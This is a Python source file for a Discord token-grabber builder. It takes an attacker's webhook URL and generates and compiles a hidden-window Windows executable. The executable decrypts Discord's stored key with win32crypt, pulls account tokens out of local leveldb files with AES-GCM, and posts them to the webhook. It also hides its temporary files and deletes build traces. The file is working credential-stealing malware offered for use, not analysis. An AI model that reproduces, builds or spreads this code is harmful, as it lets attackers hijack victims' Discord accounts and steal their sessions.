# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ------------------------------------------------------------------------------------------------
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner,
#       but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
#       propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
# ------------------------------------------------------------------------------------------------

import os
import sys
import subprocess
import shutil
import ctypes
import site
import glob as _glob
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from Config.Config import grabber_banner

LC = "\033[38;2;0;200;255m"
RS = "\033[0m"

def W(text):
    print(text, end='', flush=True)

def set_hidden(p):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p, 6)
    except:
        pass

def get_pywin32_binaries():
    args = []
    try:
        sp = site.getsitepackages()[0]
        for d, dest in [(os.path.join(sp, 'win32'), 'win32'), (os.path.join(sp, 'pywin32_system32'), '.')]:
            for pat in ['*.pyd', '*.dll']:
                for f in _glob.glob(os.path.join(d, pat)):
                    args += ['--add-binary', f'{f};{dest}']
    except:
        pass
    return args

def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    print(grabber_banner)
    print()
    W(f"{LC}Webhook : {RS}")
    w = input().strip()

    if not w.startswith('https://discord.com/api/webhooks/'):
        print(f"{LC}Invalid webhook!{RS}")
        sys.exit()

    W(f"{LC}Output file name : {RS}")
    n = input().strip() or 'grabber'

    c = '''import os
import json
import base64
import re
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import sys
WEBHOOK_URL="{webhook_url}"
if sys.platform=="win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
def get_key():
    try:
        p=os.path.expandvars(r"%APPDATA%\\discord\\Local State")
        with open(p,"r",encoding="utf-8")as f:j=json.load(f)
        return win32crypt.CryptUnprotectData(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
    except:
        return None
def decrypt(c,k):
    try:
        ci=AES.new(k,AES.MODE_GCM,nonce=c[3:15])
        return ci.decrypt_and_verify(c[15:-16],c[-16:]).decode()
    except:
        return""
def find_tokens(p,k):
    t=[]
    r=re.compile(b"dQw4w9WgXcQ:[^\\"]*")
    for f in os.listdir(p):
        if not(f.endswith(".log")or f.endswith(".ldb")):continue
        try:
            with open(os.path.join(p,f),"rb")as bf:d=bf.read()
            for m in r.findall(d):
                try:
                    dt=decrypt(base64.b64decode(m[len(b"dQw4w9WgXcQ:"):]),k)
                    if dt and len(dt.split('.'))==3:t.append(dt)
                except:continue
        except:continue
    return t
def send(t):
    if not t:return
    try:
        requests.post(WEBHOOK_URL,json={"content":"**Discord Tokens :**\\n"+"\\n".join(t)})
    except:pass
if __name__=="__main__":
    p=os.path.expandvars(r"%APPDATA%\\discord\\Local Storage\\leveldb")
    if not os.path.exists(p):sys.exit()
    k=get_key()
    if not k:sys.exit()
    send(list(set(find_tokens(p,k))))'''

    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'

    print()
    print(f"{LC}Building payload...{RS}")

    with open(t, 'w', encoding='utf-8') as f:
        f.write(c.replace('{webhook_url}', w))

    set_hidden(t)
    print(f"{LC}Compiling...{RS}")

    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        print(f"{LC}PyInstaller not found! Run: pip install pyinstaller{RS}")
        sys.exit()

    r = subprocess.run([
        'pyinstaller',
        '--onefile', '--windowed',
        '--hidden-import', 'win32crypt',
        '--hidden-import', 'win32api',
        '--hidden-import', 'win32con',
        '--hidden-import', 'win32security',
        '--hidden-import', 'pywintypes',
        '--hidden-import', 'winerror',
        '--hidden-import', 'Crypto',
        '--hidden-import', 'Crypto.Cipher',
        '--hidden-import', 'Crypto.Cipher.AES',
        '--collect-all', 'Crypto',
        *get_pywin32_binaries(),
        '--noconfirm', '--clean',
        t
    ], capture_output=True, text=True)

    if r.returncode != 0:
        print(f"{LC}Compilation error!{RS}")
        print(r.stderr[:500])
        sys.exit()

    shutil.move(f'dist/{n}_temp.exe', e)

    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass

    print()
    print(f"{LC}══════════════════════════════════════════════════════════════════════{RS}")
    print(f"{LC}                         BUILD SUCCESSFUL!{RS}")
    print(f"{LC}══════════════════════════════════════════════════════════════════════{RS}")
    print(f"{LC}Output : output/{n}.exe{RS}")
    print()

if __name__ == "__main__":
    main()
